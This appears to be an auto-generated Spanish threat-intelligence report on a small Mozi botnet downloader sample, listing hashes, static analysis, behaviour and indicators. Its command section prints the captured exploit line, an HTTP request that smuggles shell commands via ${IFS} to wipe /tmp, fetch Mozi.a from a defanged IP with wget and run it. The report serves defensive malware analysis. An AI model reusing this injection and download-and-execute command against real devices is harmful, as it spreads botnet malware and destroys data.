# 🧬 Payload Analysis

`a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141`

## 📌 Resumen

Texto ASCII de 162 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.a` en `hxxp://144.48.135.XXX:44999/Mozi.a`. Se dispone de 1 comando observado o extraído. Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141.md](../../../../../malware-like/oraculo/downloader/a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T18:39:48.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141`
- **MD5:** `c1539176db30889264fb23ccc7a44dfa`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 162 B |
| Entropía | 5.28 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://144.48.135.XXX:44999/Mozi.a;sh${IFS}/tmp/M
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://144.48.135.XXX:44999/Mozi.a;sh$ | strings |
| ip | 144.48.135.XXX | static_analysis |
| command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://144.48.135.XXX:44999/Mozi.a;sh${IFS}/tmp/M | strings |
| hash | a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
